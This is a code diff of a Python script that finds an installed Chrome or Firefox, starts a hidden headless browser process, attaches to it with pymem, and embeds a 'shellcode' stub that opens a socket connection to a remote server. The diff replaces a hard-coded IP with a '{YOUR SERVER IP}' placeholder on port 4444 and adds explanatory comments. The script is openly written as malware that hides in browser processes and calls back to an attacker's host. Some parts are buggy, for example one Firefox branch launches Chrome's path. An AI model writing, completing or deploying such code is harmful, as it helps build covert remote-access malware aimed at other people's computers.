@@ -2,8 +2,8 @@ from pymem import Pymem
 import pymem
 import os
 import subprocess
-from time import sleep
 
+#class to check if chrome exists in default windows install path
 def chromecheck():
     global chromeexists
     if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") == True:
@@ -11,6 +11,7 @@ def chromecheck():
     else:
         return False
 
+#class to check if firefox exists in default windows install path
 def firefoxcheck():
     global firefoxexists
     if os.path.exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe") == True:
@@ -18,6 +19,7 @@ def firefoxcheck():
     else:
         return False
 
+#class to check if chrome is currently running
 def is_chrome_running():
     try:
         result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq chrome.exe'], capture_output=True, text=True)
@@ -25,7 +27,8 @@ def is_chrome_running():
     except Exception as e:
         print(f"Error checking for Chrome processes: {e}")
         return False
-    
+
+#class to check if firefox is currently running
 def is_firefox_running():
     try:
         result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq firefox.exe'], capture_output=True, text=True)
@@ -33,10 +36,13 @@ def is_firefox_running():
     except Exception as e:
         print(f"Error checking for firefox processes: {e}")
         return False
-    
+
+#if chrome is installed on the system...
 if chromecheck():
     if is_chrome_running():
+        #if chrome is running...
         print("Chrome is running. Injecting...")
+        #create a new, headless "invisable" chrome thread
         chrome = [
         'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
         '--headless',
@@ -44,33 +50,44 @@ if chromecheck():
         '--disable-software-rasterizer'
         ]
         chromeproc = subprocess.Popen(chrome)
+        #inject python code into the new thread
         pm = pymem.Pymem('chrome.exe')
         print("Injected.")
     else:
+        #if chrome is not running but it is installed...
         print("Chrome is not running. Starting chrome")
+        #create new chrome process
         url = 'https://www.google.com'
         chrome_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
         chrome = [chrome_path, url]
         chromeproc = subprocess.Popen(chrome)
+        #inject python code into the new process
         pm = pymem.Pymem('chrome.exe')
         print("Injected.")
 else:
+    #if firefox is installed on the system...
     if firefoxcheck():
         if is_firefox_running():
+            #if firefox is running...
             print("Firefox is running. Injecting...")
+            #create a new, headless "invisable" firefox thread
             firefox = [
                 'C:\Program Files\Mozilla Firefox\firefox.exe',
                 '-headless'
             ]
             firefox_proc = subprocess.Popen(firefox)
+            #inject python code into the new process
             pm = pymem.Pymem('firefox.exe')
             print("Injected.")
         else:
+            #if firefox is not running but it is installed...
             print("Firefox is not running. Starting firefox")
+            #create new firefox process
             url = 'https://www.google.com'
             firefox_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
             firefox = [firefox_path, url]
-            chromeproc = subprocess.Popen(firefox)
+            firefox_proc = subprocess.Popen(firefox)
+            #inject python code into the new process
             pm = pymem.Pymem('firefox.exe')
             print("Injected.")
 
@@ -80,13 +97,10 @@ shellcode = """
 import socket
 import subprocess
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_address = ('147.182.247.60', 8080)
+server_address = ('{YOUR SERVER IP}', 4444)
 client_socket.connect(server_address)
 try:
     data = client_socket.recv(1024)
-    if data == b'hey':
-        subprocess.Popen(['calc.exe'])
-        print('bab')
     print(f"Received message from server: {data}")
 finally:
     client_socket.close()
